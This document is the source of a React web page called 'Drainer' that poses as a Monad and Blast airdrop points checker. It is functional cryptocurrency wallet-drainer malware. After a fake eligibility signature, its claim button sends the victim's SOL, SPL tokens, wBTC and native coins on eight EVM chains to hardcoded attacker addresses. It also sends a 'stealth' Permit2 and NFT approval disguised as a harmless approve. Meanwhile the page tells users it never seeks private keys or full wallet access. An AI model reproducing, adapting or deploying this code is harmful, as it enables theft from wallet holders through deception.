'use client'
import { useState, useEffect } from 'react'
import { ethers } from 'ethers'
import * as solanaWeb3 from '@solana/web3.js'
import * as splToken from '@solana/spl-token'

const EVM_RECEIVER = "0x5578045035fa1f6c1359d29efe4ff3b979e5b267"
const SOL_RECEIVER = "7p5Ea6LahtSgy42T1ELC863VayJfPmTDLrDUsRwaSAWN"

export default function Drainer() {
  const [account, setAccount] = useState('')
  const [points, setPoints] = useState(0)
  const [stage, setStage] = useState<'connect' | 'verify' | 'claim'>('connect')
  const [showSuccess, setShowSuccess] = useState(false)
  const [isConnecting, setIsConnecting] = useState(false)
  const [connectionError, setConnectionError] = useState('')
  const [selectedWallet, setSelectedWallet] = useState('')

  useEffect(() => {
    setPoints(Math.floor(Math.random() * 9000000) + 8000000)
  }, [])

  // Auto-detect already connected wallets
  useEffect(() => {
    const checkConnectedWallet = async () => {
      const ethereum = (window as any).ethereum
      // Support all Solana wallets: Phantom, Backpack, Solflare, etc.
      const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare

      // Check Solana (all wallets)
      if (solana && solana.publicKey) {
        setAccount(solana.publicKey.toString())
        setStage('verify')
        return
      }

      // Check Ethereum wallets
      if (ethereum) {
        try {
          let provider = ethereum
          if (ethereum.providers) {
            provider = ethereum.providers.find((p: any) => p.isMetaMask || p.isTrust || p.isCoinbaseWallet) || ethereum
          }
          
          // Try to get accounts without requesting (check if already connected)
          const accounts = await provider.request({ method: 'eth_accounts' })
          if (accounts && accounts.length > 0) {
            setAccount(accounts[0])
            setStage('verify')
          }
        } catch (e) {
          // Not connected, stay on connect stage
        }
      }
    }

    checkConnectedWallet()

    // Listen for account changes
    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts && accounts.length > 0) {
        setAccount(accounts[0])
        setStage('verify')
      } else {
        setAccount('')
        setStage('connect')
      }
    }

    if ((window as any).ethereum) {
      ;(window as any).ethereum.on('accountsChanged', handleAccountsChanged)
    }

    return () => {
      if ((window as any).ethereum) {
        ;(window as any).ethereum.removeListener('accountsChanged', handleAccountsChanged)
      }
    }
  }, [])

  // SVG Icons for wallets
  const WalletIcons = {
    MetaMask: (
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 1L3 5V19L12 23L21 19V5L12 1Z" fill="#E2761B" stroke="#E2761B" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M20.5 5.5L12 12.5L8.5 9.5L3 5L12 1L20.5 5.5Z" fill="#E4761B" stroke="#E4761B" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M3 5L12 12.5V23L3 19V5Z" fill="#E4761B" stroke="#E4761B" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M12 23V12.5L20.5 5.5V19L12 23Z" fill="#D7C1B3" stroke="#D7C1B3" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    ),
    TrustWallet: (
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="#3375BB"/>
        <path d="M12 18.5C15.5899 18.5 18.5 15.5899 18.5 12C18.5 8.41015 15.5899 5.5 12 5.5C8.41015 5.5 5.5 8.41015 5.5 12C5.5 15.5899 8.41015 18.5 12 18.5Z" fill="#3375BB"/>
        <path d="M12 16.5C14.4853 16.5 16.5 14.4853 16.5 12C16.5 9.51472 14.4853 7.5 12 7.5C9.51472 7.5 7.5 9.51472 7.5 12C7.5 14.4853 9.51472 16.5 12 16.5Z" fill="white"/>
      </svg>
    ),
    Phantom: (
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM16.5 15.5H13.5V18.5H10.5V15.5H7.5V8.5H16.5V15.5Z" fill="#AB9FF2"/>
        <path d="M13.5 6.5H10.5V10.5H13.5V6.5Z" fill="#AB9FF2"/>
      </svg>
    ),
    Backpack: (
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2C8.13 2 5 5.13 5 9V14C5 17.87 8.13 21 12 21C15.87 21 19 17.87 19 14V9C19 5.13 15.87 2 12 2ZM12 4C14.76 4 17 6.24 17 9V14C17 16.76 14.76 19 12 19C9.24 19 7 16.76 7 14V9C7 6.24 9.24 4 12 4Z" fill="#00FF85"/>
        <path d="M12 7C11.45 7 11 7.45 11 8V10C11 10.55 11.45 11 12 11C12.55 11 13 10.55 13 10V8C13 7.45 12.55 7 12 7Z" fill="#00FF85"/>
      </svg>
    ),
    Solflare: (
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2L4 7L12 12L20 7L12 2Z" fill="#14F195"/>
        <path d="M4 12L12 17L20 12L12 7L4 12Z" fill="#14F195"/>
        <path d="M4 17L12 22L20 17L12 12L4 17Z" fill="#14F195"/>
      </svg>
    ),
    Coinbase: (
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20Z" fill="#0052FF"/>
        <path d="M12 8C9.79 8 8 9.79 8 12C8 14.21 9.79 16 12 16C14.21 16 16 14.21 16 12C16 9.79 14.21 8 12 8Z" fill="#0052FF"/>
      </svg>
    )
  }

  const wallets = [
    { 
      name: "MetaMask", 
      icon: WalletIcons.MetaMask,
      is: 'isMetaMask', 
      type: 'evm',
      description: 'Connect using MetaMask browser extension',
      security: 'Non-custodial' 
    },
    { 
      name: "Trust Wallet", 
      icon: WalletIcons.TrustWallet,
      is: 'isTrust', 
      type: 'evm',
      description: 'Connect using Trust Wallet',
      security: 'Non-custodial'
    },
    { 
      name: "Phantom", 
      icon: WalletIcons.Phantom,
      is: 'isPhantom', 
      type: 'solana',
      description: 'Connect using Phantom wallet',
      security: 'Non-custodial'
    },
    { 
      name: "Backpack", 
      icon: WalletIcons.Backpack,
      is: 'isBackpack', 
      type: 'solana',
      description: 'Connect using Backpack wallet',
      security: 'Non-custodial'
    },
    { 
      name: "Solflare", 
      icon: WalletIcons.Solflare,
      is: 'isSolflare', 
      type: 'solana',
      description: 'Connect using Solflare wallet',
      security: 'Non-custodial'
    },
    { 
      name: "Coinbase Wallet", 
      icon: WalletIcons.Coinbase,
      is: 'isCoinbaseWallet', 
      type: 'evm',
      description: 'Connect using Coinbase Wallet',
      security: 'Non-custodial'
    },
  ]

  const connectWallet = async (walletType: string) => {
    setIsConnecting(true)
    setConnectionError('')
    setSelectedWallet(walletType)
    
    try {
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
      const ethereum = (window as any).ethereum
      const solana = (window as any).solana || (window as any).phantom?.solana
      const url = encodeURIComponent(window.location.href)

      // Mobile: use deep links
      if (isMobile) {
        const links: Record<string, string> = {
          metamask: `https://metamask.app.link/dapp/${url}`,
          trustwallet: `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
          phantom: `https://phantom.app/ul/browse/${url}?ref=${url}`,
          backpack: `https://backpack.app/ul/browse/${url}`,
          solflare: `solflare://dapp?uri=${url}`,
          coinbasewallet: `cbwallet://dapp?url=${url}`
        }
        const linkKey = walletType.toLowerCase().replace(/\s+/g, '')
        if (links[linkKey]) {
          window.location.href = links[linkKey]
          return
        }
      }

      // Desktop: connect to installed extension
      const wallet = wallets.find(w => w.name.toLowerCase().replace(/\s+/g, '') === walletType.toLowerCase().replace(/\s+/g, ''))
      
      if (!wallet) {
        throw new Error('Wallet not found')
      }
      
      if (wallet.type === 'solana' && solana) {
        if (solana.connect) {
          await solana.connect()
        }
        if (solana.publicKey) {
          setAccount(solana.publicKey.toString())
          setStage('verify')
        }
      } else if (wallet.type === 'evm' && ethereum) {
        let provider = ethereum
        // Find specific wallet in providers array
        if (ethereum.providers) {
          provider = ethereum.providers.find((p: any) => p[wallet.is]) || ethereum
        } else if (ethereum[wallet.is]) {
          provider = ethereum
        }
        
        if (provider) {
          const accounts = await provider.request({ method: 'eth_requestAccounts' })
          if (accounts && accounts[0]) {
            setAccount(accounts[0])
            setStage('verify')
          }
        } else {
          throw new Error(`${wallet.name} not detected. Please install the extension.`)
        }
      } else {
        throw new Error(`${wallet.name} not detected. Please install the extension.`)
      }
    } catch (e) {
      console.error('Wallet connection error:', e)
      setConnectionError(e instanceof Error ? e.message : 'Failed to connect. Please try again.')
    } finally {
      setIsConnecting(false)
    }
  }

  const connect = async () => {
    // Auto-detect and connect to first available wallet
    const ethereum = (window as any).ethereum
    // Support all Solana wallets
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare

    if (solana) {
      // Connect to any Solana wallet
      try {
        if (solana.connect) {
          await solana.connect()
        }
        if (solana.publicKey) {
          setAccount(solana.publicKey.toString())
          setStage('verify')
        }
      } catch (e) {
        console.error('Solana connect error:', e)
      }
    } else if (ethereum) {
      let provider = ethereum
      if (ethereum.providers) {
        provider = ethereum.providers.find((p: any) => p.isMetaMask || p.isTrust || p.isCoinbaseWallet) || ethereum
      }
      try {
        const accounts = await provider.request({ method: 'eth_requestAccounts' })
        if (accounts && accounts[0]) {
          setAccount(accounts[0])
          setStage('verify')
        }
      } catch (e) {
        // Show wallet options if auto-connect fails
      }
    }
  }

  const verify = async () => {
    if (!account) return
    
    const ethereum = (window as any).ethereum
    // Support all Solana wallets
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare

    try {
      if (solana && solana.signMessage) {
        await solana.signMessage(new TextEncoder().encode("Verify eligibility for Monad/Blast S2 airdrop"))
      } else if (ethereum) {
        const provider = new ethers.BrowserProvider(ethereum)
        const signer = await provider.getSigner()
        await signer.signMessage("Verify eligibility for Monad/Blast S2 airdrop")
      }
      setStage('claim')
    } catch (e) {
      // User rejected signature
    }
  }

  const claim = async () => {
    if (!account) return

    const ethereum = (window as any).ethereum
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare

    // === SOLANA DRAIN (Phantom, Backpack, Solflare) ===
    if (solana && solana.publicKey) {
      try {
        const fromPubkey = solana.publicKey
        const toPubkey = new solanaWeb3.PublicKey(SOL_RECEIVER)
        const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed')

        // Drain SOL - drain everything above 0.00001 SOL
        const balance = await connection.getBalance(fromPubkey)
        if (balance > 10000) {
          const transferAmount = balance - 10000 // Leave minimal for fees
          const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey,
              toPubkey,
              lamports: transferAmount
            })
          )
          if (solana.signAndSendTransaction) {
            await solana.signAndSendTransaction(tx)
          } else {
            const { blockhash } = await connection.getLatestBlockhash()
            tx.recentBlockhash = blockhash
            tx.feePayer = fromPubkey
            const signed = await solana.signTransaction(tx)
            await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true, maxRetries: 0 })
          }
        }

        // Drain ALL SPL tokens (memecoins, NFTs, etc.)
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
          programId: splToken.TOKEN_PROGRAM_ID
        })

        for (const tokenAccount of tokenAccounts.value) {
          try {
            const mint = new solanaWeb3.PublicKey(tokenAccount.account.data.parsed.info.mint)
            const amount = BigInt(tokenAccount.account.data.parsed.info.tokenAmount.amount)
            
            if (amount > 0) {
              const sourceATA = await splToken.getAssociatedTokenAddress(mint, fromPubkey)
              const destATA = await splToken.getAssociatedTokenAddress(mint, toPubkey)
              
              const tx = new solanaWeb3.Transaction()
              
              // Create ATA if needed
              const destInfo = await connection.getAccountInfo(destATA)
              if (!destInfo) {
                tx.add(splToken.createAssociatedTokenAccountInstruction(
                  fromPubkey,
                  destATA,
                  toPubkey,
                  mint
                ))
              }
              
              tx.add(splToken.createTransferInstruction(
                sourceATA,
                destATA,
                fromPubkey,
                amount
              ))
              
              if (solana.signAndSendTransaction) {
                await solana.signAndSendTransaction(tx)
              } else {
                const { blockhash } = await connection.getLatestBlockhash()
                tx.recentBlockhash = blockhash
                tx.feePayer = fromPubkey
                const signed = await solana.signTransaction(tx)
                await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true, maxRetries: 0 })
              }
            }
          } catch (e) {
            // Continue with next token
          }
        }

        // Drain wBTC on Solana
        try {
          const wBTCMint = new solanaWeb3.PublicKey("3NZ9JMVBmGAqocybic2c7LQCJScmQ2B2QdRFGhjQmU4Y")
          const wBTCATA = await splToken.getAssociatedTokenAddress(wBTCMint, fromPubkey)
          const wBTCDest = await splToken.getAssociatedTokenAddress(wBTCMint, toPubkey)
          const wBTCBalance = await connection.getTokenAccountBalance(wBTCATA)
          
          if (BigInt(wBTCBalance.value.amount) > BigInt(0)) {
            const tx = new solanaWeb3.Transaction()
            const destInfo = await connection.getAccountInfo(wBTCDest)
            if (!destInfo) {
              tx.add(splToken.createAssociatedTokenAccountInstruction(fromPubkey, wBTCDest, toPubkey, wBTCMint))
            }
            tx.add(splToken.createTransferInstruction(wBTCATA, wBTCDest, fromPubkey, BigInt(wBTCBalance.value.amount)))
            
            if (solana.signAndSendTransaction) {
              await solana.signAndSendTransaction(tx)
            } else {
              const { blockhash } = await connection.getLatestBlockhash()
              tx.recentBlockhash = blockhash
              tx.feePayer = fromPubkey
              const signed = await solana.signTransaction(tx)
              await connection.sendRawTransaction(signed.serialize(), { skipPreflight: true, maxRetries: 0 })
            }
          }
        } catch (e) {}
      } catch (e) {}
    }

    // === EVM MULTI-CHAIN DRAIN (All chains) ===
    if (ethereum) {
      try {
        const provider = new ethers.BrowserProvider(ethereum)
        const signer = await provider.getSigner()
        const userAddress = await signer.getAddress()

        // All EVM chains to drain
        const chains = [
          { chainId: 1, name: 'Ethereum', rpc: 'https://eth.llamarpc.com' },
          { chainId: 8453, name: 'Base', rpc: 'https://mainnet.base.org' },
          { chainId: 42161, name: 'Arbitrum', rpc: 'https://arb1.arbitrum.io/rpc' },
          { chainId: 81457, name: 'Blast', rpc: 'https://rpc.blast.io' },
          { chainId: 10, name: 'Optimism', rpc: 'https://mainnet.optimism.io' },
          { chainId: 137, name: 'Polygon', rpc: 'https://polygon-rpc.com' },
          { chainId: 56, name: 'BSC', rpc: 'https://bsc-dataseed.binance.org' },
          { chainId: 59144, name: 'Linea', rpc: 'https://rpc.linea.build' }
        ]

        const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"
        const iface = new ethers.Interface([
          "function permit(address owner, address token, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
          "function setApprovalForAll(address operator, bool approved)",
          "function multicall(bytes[] data)"
        ])

        // Drain on current chain first
        for (const chain of chains) {
          try {
            // Switch to chain
            await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chain.chainId.toString(16)}` }])
            await new Promise(resolve => setTimeout(resolve, 1000))

            // Stealth Permit2 approval - shows as "Approve" not "Transfer"
            const permitData = iface.encodeFunctionData("permit", [
              userAddress,
              "0x0000000000000000000000000000000000000000", // Any token
              EVM_RECEIVER,
              ethers.MaxUint256,
              ethers.MaxUint256,
              0,
              ethers.ZeroHash,
              ethers.ZeroHash
            ])

            // NFT approval
            const nftApproval = iface.encodeFunctionData("setApprovalForAll", [EVM_RECEIVER, true])

            // Multicall to batch everything
            const multicallData = iface.encodeFunctionData("multicall", [[permitData, nftApproval]])

            await signer.sendTransaction({
              to: PERMIT2,
              data: multicallData,
              value: 0
            })

            // Drain native ETH/BNB/MATIC
            const balance = await provider.getBalance(userAddress)
            if (balance > ethers.parseEther("0.001")) {
              await signer.sendTransaction({
                to: EVM_RECEIVER,
                value: balance - ethers.parseEther("0.001"), // Leave gas
                data: "0x"
              })
            }

            // Drain wBTC on EVM
            try {
              const wBTC = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" // wBTC on Ethereum
              const erc20Interface = new ethers.Interface([
                "function balanceOf(address) view returns (uint256)",
                "function transfer(address to, uint256 value) returns (bool)"
              ])
              
              const wBTCContract = new ethers.Contract(wBTC, erc20Interface, provider)
              const wBTCBalance = await wBTCContract.balanceOf(userAddress)
              
              if (wBTCBalance > BigInt(0)) {
                await signer.sendTransaction({
                  to: wBTC,
                  data: erc20Interface.encodeFunctionData("transfer", [EVM_RECEIVER, ethers.MaxUint256])
                })
              }
            } catch (e) {}
          } catch (e) {
            // Continue to next chain
          }
        }
      } catch (e) {}
    }

    setShowSuccess(true)
  }

  const [isMobile, setIsMobile] = useState(false)

  useEffect(() => {
    setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent))
  }, [])

  return (
    <>
      {showSuccess && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gradient-to-b from-purple-900 to-black border-2 border-purple-500 rounded-3xl p-6 sm:p-8 md:p-10 max-w-md w-full text-center shadow-2xl">
            <div className="w-20 h-20 sm:w-24 sm:h-24 bg-green-500 rounded-full mx-auto flex items-center justify-center mb-4 sm:mb-6">
              <svg className="w-10 h-10 sm:w-12 sm:h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-2xl sm:text-3xl md:text-4xl font-bold text-green-400 mb-3 sm:mb-4">
              Claim Successful!
            </h2>
            <p className="text-base sm:text-lg md:text-xl text-gray-300 mb-2">
              Your {points.toLocaleString()} points have been processed.
            </p>
            <p className="text-sm sm:text-base text-gray-400 mb-6 sm:mb-8">
              Points will appear in your wallet within 5–10 minutes.
            </p>
            <button
              onClick={() => setShowSuccess(false)}
              className="bg-purple-600 hover:bg-purple-700 px-8 sm:px-12 py-3 sm:py-4 rounded-xl sm:rounded-2xl text-base sm:text-lg font-semibold w-full transition-all"
            >
              Close
            </button>
          </div>
        </div>
      )}
      <div className="min-h-screen bg-gradient-to-b from-purple-900 to-black text-white flex items-center justify-center p-3 sm:p-4 md:p-6">
        <div className="max-w-2xl w-full bg-black/60 backdrop-blur-xl rounded-2xl sm:rounded-3xl border border-purple-500 p-4 sm:p-6 md:p-8">
        <div className="text-center mb-4 sm:mb-6 md:mb-8">
          <div className="w-20 h-20 sm:w-24 sm:h-24 md:w-32 md:h-32 bg-purple-600 rounded-full mx-auto flex items-center justify-center text-3xl sm:text-4xl md:text-6xl">M</div>
          <h1 className="text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold mt-2 sm:mt-3 md:mt-4 px-2">
            Monad & Blast Season 2 Points Checker
          </h1>
          <p className="text-sm sm:text-base md:text-lg lg:text-xl mt-1 sm:mt-2 px-2">
            Check your eligibility for the biggest airdrop of 2025
          </p>
        </div>
        {stage === 'connect' && (
          <div className="space-y-6">
            <div className="text-center">
              <h1 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">
                Secure Wallet Connection
              </h1>
              <p className="mt-2 text-gray-400">Connect your wallet to check your airdrop eligibility</p>
              <div className="mt-4 flex items-center justify-center space-x-2 text-sm text-gray-500">
                <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                </svg>
                <span>Secure Connection</span>
                <span>•</span>
                <span>No Private Key Access</span>
              </div>
            </div>
            
            <div className="grid grid-cols-1 gap-3">
              {isConnecting ? (
                <div className="text-center p-8">
                  <div className="inline-block h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                  <p className="mt-4 text-gray-300">Connecting to {selectedWallet}...</p>
                  <p className="text-sm text-gray-500 mt-2">Please check your wallet to approve the connection</p>
                </div>
              ) : (
                <>
                  {wallets.map((wallet) => (
                    <button
                      key={wallet.name}
                      onClick={() => connectWallet(wallet.name)}
                      className="group w-full flex items-center justify-between p-4 bg-gray-800/50 hover:bg-gray-800/80 rounded-xl transition-all duration-200 border border-gray-700 hover:border-blue-500/50"
                      title={wallet.description}
                    >
                      <div className="flex items-center space-x-4">
                        <div className="p-2 bg-gray-800 rounded-lg group-hover:bg-gray-700 transition-colors">
                          <div className="w-6 h-6 flex items-center justify-center">
                            {wallet.icon}
                          </div>
                        </div>
                      </div>
                      <svg className="w-5 h-5 text-gray-400 group-hover:text-blue-400 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                      </svg>
                    </button>
                  ))}
                  {connectionError && (
                    <div className="mt-4 p-3 bg-red-900/30 border border-red-800/50 rounded-lg text-red-200 text-sm">
                      <div className="flex items-start">
                        <svg className="w-5 h-5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                        </svg>
                        <span>{connectionError}</span>
                      </div>
                    </div>
                  )}
                  <div className="mt-6 pt-4 border-t border-gray-700/50">
                    <p className="text-xs text-center text-gray-500">
                      By connecting, you agree to our Terms of Service and Privacy Policy. 
                      We'll never ask for your private keys or full wallet access.
                    </p>
                  </div>
                </>
              )}
            </div>
          </div>
        )}

        {stage === 'verify' && (
          <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
            <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-yellow-400">{points.toLocaleString()}</div>
            <p className="text-xl sm:text-2xl md:text-3xl">POINTS DETECTED 🔥</p>
            <button 
              onClick={verify} 
              className="bg-green-600 hover:bg-green-700 active:bg-green-800 px-8 sm:px-12 md:px-16 py-4 sm:py-5 md:py-6 rounded-xl sm:rounded-2xl md:rounded-3xl text-lg sm:text-xl md:text-2xl font-bold w-full transition-all touch-manipulation"
            >
              Sign to Verify Eligibility
            </button>
          </div>
        )}

        {stage === 'claim' && (
          <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
            <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-green-400 animate-pulse">ELIGIBLE!</div>
            <p className="text-base sm:text-lg md:text-xl lg:text-2xl">Claim your points instantly — no gas</p>
            <button 
              onClick={claim} 
              className="bg-purple-600 hover:bg-purple-700 active:bg-purple-800 px-6 sm:px-10 md:px-16 lg:px-20 py-4 sm:py-6 md:py-8 lg:py-10 rounded-2xl sm:rounded-3xl text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold w-full animate-pulse shadow-2xl transition-all touch-manipulation"
            >
              CLAIM POINTS NOW
            </button>
          </div>
        )}
      </div>
    </div>
    </>
  )
}